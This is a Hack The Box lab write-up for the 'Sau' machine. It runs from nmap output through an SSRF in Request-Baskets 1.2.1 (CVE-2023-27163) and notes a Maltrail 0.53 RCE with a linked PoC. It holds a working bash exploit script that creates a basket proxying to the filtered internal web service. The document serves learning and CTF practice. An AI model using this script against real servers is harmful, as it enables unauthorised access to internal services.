# HTB - Sau: 
# IP: 10.10.11.224, sau.htb

# Methodology

...ew > Investigate > Research > Assess > Exploit > Review > Inv...

1. Investigate current levels of access & used technologies
2. Research for code / known vulnerabilities
3. Assess the usefulness of research against target
4. Use research to exploit target
5. Review new levels of access / knowledge gained

While the cycle is best repeated fully it is allowable to break back to step one at any time if issues arrise which prevent progress during the other steps.

# Investigate

## NMAP
```
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
80/tcp    filtered http
55555/tcp open     unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Fri, 11 Aug 2023 16:34:28 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Fri, 11 Aug 2023 16:34:03 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Fri, 11 Aug 2023 16:34:03 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port55555-TCP:V=7.94%I=7%D=8/11%Time=64D662FB%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,A2,"HTTP/1\.0\x20302\x20Found\r\nContent-Type:\x20text/html;\
SF:x20charset=utf-8\r\nLocation:\x20/web\r\nDate:\x20Fri,\x2011\x20Aug\x20
SF:2023\x2016:34:03\x20GMT\r\nContent-Length:\x2027\r\n\r\n<a\x20href=\"/w
SF:eb\">Found</a>\.\n\n")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x
SF:20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,60,"HTTP/1\.0\x202
SF:00\x20OK\r\nAllow:\x20GET,\x20OPTIONS\r\nDate:\x20Fri,\x2011\x20Aug\x20
SF:2023\x2016:34:03\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest
SF:,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;
SF:\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request"
SF:)%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
SF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20
SF:Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
SF:tent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\
SF:r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x20400\
SF:x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nC
SF:onnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67,"
SF:HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20c
SF:harset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(K
SF:erberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
SF:equest")%r(FourOhFourRequest,EA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\n
SF:Content-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Type-Options
SF::\x20nosniff\r\nDate:\x20Fri,\x2011\x20Aug\x202023\x2016:34:28\x20GMT\r
SF:\nContent-Length:\x2075\r\n\r\ninvalid\x20basket\x20name;\x20the\x20nam
SF:e\x20does\x20not\x20match\x20pattern:\x20\^\[\\w\\d\\-_\\\.\]{1,250}\$\
SF:n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:
SF:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20
SF:Bad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request
SF:\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20clo
SF:se\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## Web Content
Filtered site at port 80, port 55555 holds an interesting site however:
### Request-Baskets: 55555
Version: 1.2.1 (newest is 1.2.3)

### Request-Baskets(SSRF):55555 -> Maltrail:80
Version: 0.53 (newest is 0.60)



# Research
## Requests-Baskets
"Request Baskets is a web service to collect arbitrary HTTP requests and inspect them via RESTful API or simple web UI." - Github

It is in a sense proxying the web requests sent to the site in some way for logging purposes.

### SSRF [Confirmed]
Unfortunately this version has a SSRF (Server side request forgery) vulnerability which has workable PoC (proof of concepts). e.g. https://github.com/entr0pie/CVE-2023-27163

SSRF is essentially allowing an attacker to create traffic as if it was generated by the victim device.

Why would a SSRF vulnerability be useful here? Because of the filtered web port. There is a possibility that there is indeed a web site running there but it is only acessable via the local device. If this site has a SSRF vulnerability it could be used to gain access to this filtered site.

## Maltrail
"Maltrail is a malicious traffic detection system, utilizing publicly available (black)lists containing malicious and/or generally suspicious trails" - Github

### RCE [Assessing]
Traffic detection system, again unfortunately this system also has a widely known vulnerability with PoC: https://github.com/spookier/Maltrail-v0.53-Exploit

This time there is a more severe RCE (Remote Code Execution) vulnerability which if successfully exploited would allow futher internal access to the underlying server and potentially even more vulnerable services.



# Assess
## Requests-Baskets
The linked github PoC is very simple, simple enough for it to be worth me working through it myself by reviewing the code provided rather than just running it.

```bash
BASKET_NAME=$(LC_ALL=C tr -dc 'a-z' </dev/urandom | head -c "6");

API_URL="$URL""api/baskets/$BASKET_NAME";

PAYLOAD="{\"forward_url\": \"$ATTACKER_SERVER\",\"proxy_response\": true,\"insecure_tls\": false,\"expand_path\": true,\"capacity\": 250}";

```

First, the bash script generates a basketname, `LC_ALL=C` sets the device localisation to a "simple locale", unknown if this is needed but as it seems to generate the name from `/dev/urandom`. I may also have to use it.

The script also uses the `tr -dc 'a-z'` command to remove all characters not in the lowecase latin alphabet from the `/dev/urandom` pipe. 

It then uses head to get the first 6 "bytes of the file", i think this may be where the issue lies with unsafe handling of odd characters, as head is splitting on bytes it's possible to end up with weird output such as:

```bash
LC_ALL=C tr -dc 'a-z' </dev/urandom | head -c "6"
jpbjgc%                                 
```

The `API_URL` variable is pretty easy to understand, as it matches the api calls seen in burp and on the webpage. (/api/baskets/..)

The `PAYLOAD` variable is another key input, the site during normal input requests the end user make a new basket before being able to configure it, whereas the script does it in the same request as the creation of the basket.

The script provided i believe to be a little confusing due to the script naming the accessed site as "attacker server" and the requests-baskets server as the "target", i believe a better name scheme would be "target" for the filtered site, and "vulnerable" for the requests-baskets, so i'll use that in my script provided.

The "attacker" is me but the system is a one way proxy and as such does not require the attacker IP.

As there is direct access to the /dev/urandom device i will also choose to create a simple bash script which creates a proxy basket to the local web server.

The rest of this PoC is pretty useless just some error handling which just makes it a little harder to read. My created PoC is in the [Exploit](#exploit) section.

## Maltrail

Again, the linked PoC seems very simple and so a deconstruction is appropriate.

# Exploit

## Request-Baskets

```bash
#!/bin/bash
vulnerable="http://sau.htb:55555"; #requests-buckets site
api_path="/api/baskets/"; #api path
target="http://localhost"; #target from the vulnerable site's point of view (localhost here indicates localhost on vulnerable server)
basket=$(LC_ALL=C tr -dc 'a-z' </dev/urandom | head -c "6");

vulnerablebasket="$vulnerable$api_path$basket";
body="{\"forward_url\": \"$target\",\"proxy_response\": true,\"insecure_tls\": false,\"expand_path\": true,\"capacity\": 250}";

echo "Creating vulnerable basket..."

curl -s -X POST -H 'Content-Type: application/json' -d "$body" "$vulnerablebasket" #post request to create basket with params

echo "Access gained via: $vulnerable$basket" #link to proxied website

```

```bash
./exploit-rb.sh 
Creating vulnerable basket...
{"token":"s8_UHhIlk_Fd2l0eKuHjZZQDcTBSC0-jZ4gzoElWHw4F"}Access gained via: http://sau.htb:55555/kpcecz
```

And what do we get when we visit that page?
![Maltrail via SSRF]()

# Review
## Request-Baskets
An extremely easy to exploit attack surface of Requests-Buckets allowed further exploitation of the system by granting access to "internal" services local to the vulnerable device.

Updating to the newest version is recommended to prevent futher exploitation.
